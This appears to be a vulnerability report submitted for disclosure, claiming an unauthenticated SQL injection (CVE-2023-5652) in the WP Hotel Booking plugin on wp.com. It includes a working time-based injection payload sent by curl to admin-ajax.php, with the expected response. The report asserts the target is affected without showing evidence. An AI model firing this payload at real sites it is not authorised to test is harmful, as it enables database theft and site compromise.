# CRITICAL: Unauthenticated SQL Injection on wp.com via CVE-2023-5652

## Summary

The WP Hotel Booking WordPress plugin on wp.com is vulnerable to a CRITICAL unauthenticated SQL Injection vulnerability (CVE-2023-5652, CVSS 9.8). An attacker can execute arbitrary SQL queries against the WordPress database without any authentication or CSRF tokens. This allows extraction, modification, or deletion of all database contents.

## Vulnerability Type

SQL Injection (CWE-89)

## Severity

**CRITICAL**
- CVSS v3.1: **9.8/10** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- EPSS Score: 0.714 (71.4% exploitation probability in the wild)

## Steps to Reproduce

### Proof of Concept

```bash
curl -X POST "https://wp.com/wp-admin/admin-ajax.php" --data-urlencode "action=x&taxonomy=hb_room_type&hb_room_type_ordering[1]=0 END, name=(SELECT SLEEP(8)), term_id=CASE when 1=1 THEN 1"
```

The server will pause for ~8 seconds before responding, confirming SQL injection execution.

**Expected response:**
- Response time: 8+ seconds
- HTTP Status: 400 Bad Request
- Body: `0`

## Impact

Unauthenticated SQL injection allows attackers to:
- Extract entire database (user credentials, emails, personal info)
- Modify or delete all data
- Create admin accounts
- Potential full site compromise (RCE via MySQL)

CVSS 9.8/10 with 71.4% exploitation probability in the wild.

## References

- CVE-2023-5652: https://nvd.nist.gov/vuln/detail/CVE-2023-5652
- Wordfence: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-hotel-booking/wp-hotel-booking-207-unauthenticated-sqli
- Nuclei Template: https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-5652.yaml
